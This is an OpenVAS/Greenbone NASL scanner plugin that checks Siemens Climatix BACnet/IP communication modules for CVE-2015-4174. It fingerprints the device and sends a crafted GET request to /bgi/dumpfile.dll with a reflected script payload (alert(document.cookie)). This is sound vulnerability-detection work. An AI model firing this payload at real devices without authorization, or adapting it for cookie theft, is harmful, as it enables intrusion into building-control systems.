if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805713" );
	script_version( "2021-08-10T15:24:26+0000" );
	script_cve_id( "CVE-2015-4174" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2021-08-10 15:24:26 +0000 (Tue, 10 Aug 2021)" );
	script_tag( name: "creation_date", value: "2015-07-03 16:04:22 +0530 (Fri, 03 Jul 2015)" );
	script_name( "Climatix BACnet/IP Communication Module Multiple Vulnerabilities" );
	script_tag( name: "summary", value: "This host is installed with Climatix
  BACnet/IP Communication Module and is prone to multiple vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to read cookie or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to:

  - The application does not validate input to the 'dumpfile.dll' before
    returning it to users.

  - The application allow unrestricted upload of files" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker
  to execute arbitrary HTML and script code in the context of an affected site." );
	script_tag( name: "affected", value: "Climatix BACnet/IP communication module
  before v10.34." );
	script_tag( name: "solution", value: "Upgrade to version 10.34 or above.
  details are available." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/132514/climatixbacnet-xss.txt" );
	script_xref( name: "URL", value: "http://www.siemens.com/innovation/pool/de/forschungsfelder/siemens_security_advisory_ssa-142512.pdf" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
http_port = http_get_port( default: 80 );
rcvRes = http_get_cache( item: "/", port: http_port );
if(ContainsString( rcvRes, ">Climatix<" ) || ContainsString( rcvRes, ">deviceWEB<" ) || ContainsString( rcvRes, "RMS_Banner.html" )){
	url = "/bgi/dumpfile.dll?\";)</b><script>alert(document.cookie);</script>";
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "<script>alert\\(document.cookie\\)" )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}
exit( 99 );

